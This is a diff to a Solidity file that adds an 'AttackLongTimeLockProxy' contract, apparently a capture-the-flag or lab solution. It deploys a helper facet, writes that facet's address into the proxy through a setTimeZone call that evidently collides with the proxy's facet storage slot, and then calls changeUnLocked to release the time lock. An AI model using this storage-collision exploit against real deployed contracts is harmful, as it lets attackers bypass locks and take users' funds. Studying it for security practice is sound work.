@@ -38,3 +38,32 @@ contract LongTimeLockProxy {
     receive() external payable {}
 
 }
+
+interface  funcs {
+    function setTimeZone(uint _timeZone) external;
+    function changeUnLocked() external;
+}
+
+contract AttackLongTimeLockProxy {
+
+    function attack(address _proxy) external {
+        HelperFacet _insFacet = new HelperFacet();
+        uint _newFacetAdress = uint256(uint160(address(_insFacet)));
+        funcs _funcs = funcs(_proxy);
+        _funcs.setTimeZone(_newFacetAdress);
+        _funcs.changeUnLocked();
+    }
+
+}
+
+contract HelperFacet {
+
+    address public facet;
+    bool public unlocked;
+    uint public constant waitTime = 100 days;
+
+    function changeUnLocked() external {
+        unlocked = true;
+    }
+    
+}
